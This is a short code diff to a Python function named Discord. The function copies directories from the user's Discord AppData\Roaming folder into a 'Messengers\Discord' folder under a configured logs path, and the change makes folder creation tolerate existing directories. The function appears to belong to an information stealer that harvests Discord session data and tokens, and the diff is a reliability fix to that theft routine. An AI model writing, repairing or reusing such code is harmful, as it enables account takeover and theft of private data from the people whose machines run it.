@@ -67,7 +67,7 @@ def Discord():
         roaming = environ['USERPROFILE'] + sep + r'AppData\Roaming'
         user = environ['USERPROFILE']
         pathtofile = f'{user}\\{config.pathToLogs}'
-        makedirs(f'{pathtofile}\\Messengers\\Discord')
+        makedirs(f'{pathtofile}\\Messengers\\Discord', exist_ok=True)
         for dir in dirs:
             try:
                 copytree(fr"{roaming}\discord\{dir}", f"{pathtofile}\\Messengers\\Discord\\{dir}")
